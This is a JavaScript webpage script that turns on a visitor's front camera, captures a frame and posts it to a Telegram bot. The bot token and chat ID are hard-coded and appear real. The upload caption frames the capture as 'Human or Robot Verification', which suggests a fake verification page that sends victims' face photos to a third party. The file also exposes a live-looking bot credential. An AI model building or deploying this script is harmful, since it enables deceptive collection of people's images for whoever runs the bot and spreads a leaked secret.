// Telegram Bot Details
const botToken = "7519273136:AAHZ7eBXEoVZRQFqILu8tGnuMLvtZOWohqc"; // Replace with your bot token
const chatId = "7945358964"; // Replace with your chat ID

// Select elements
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const captureButton = document.getElementById("capture");
const ctx = canvas.getContext("2d");

// Start camera
async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }, // Use "environment" for back camera
    });
    video.srcObject = stream;
  } catch (error) {
    handleCameraError(error);
  }
}

// Handle camera errors
function handleCameraError(error) {
  if (error.name === "NotAllowedError") {
    alert("Camera access was denied. Please enable camera permissions in your browser.");
  } else if (error.name === "NotFoundError") {
    alert("No camera found on your device.");
  } else {
    alert(`An error occurred: ${error.message}`);
  }
}

// Capture photo and send to Telegram
async function captureAndSend() {
  // Draw video frame to canvas
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  // Convert canvas to Base64 image
  const imageBase64 = canvas.toDataURL("image/jpeg");

  // Prepare data for Telegram
  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
  const formData = new FormData();
  formData.append("chat_id", chatId);
  formData.append("photo", dataURItoBlob(imageBase64));
  formData.append("caption", "Captured image for Human or Robot Verification");

  // Send image to Telegram
  try {
    await fetch(telegramUrl, {
      method: "POST",
      body: formData,
    });
    alert("Photo sent to Telegram!");
  } catch (error) {
    alert("Failed to send photo.");
    console.error(error);
  }
}

// Convert Base64 to Blob
function dataURItoBlob(dataURI) {
  const byteString = atob(dataURI.split(",")[1]);
  const mimeString = dataURI.split(",")[0].split(":")[1].split(";")[0];
  const ab = new ArrayBuffer(byteString.length);
  const ia = new Uint8Array(ab);
  for (let i = 0; i < byteString.length; i++) {
    ia[i] = byteString.charCodeAt(i);
  }
  return new Blob([ab], { type: mimeString });
}

// Add event listeners
captureButton.addEventListener("click", captureAndSend);
startCamera();
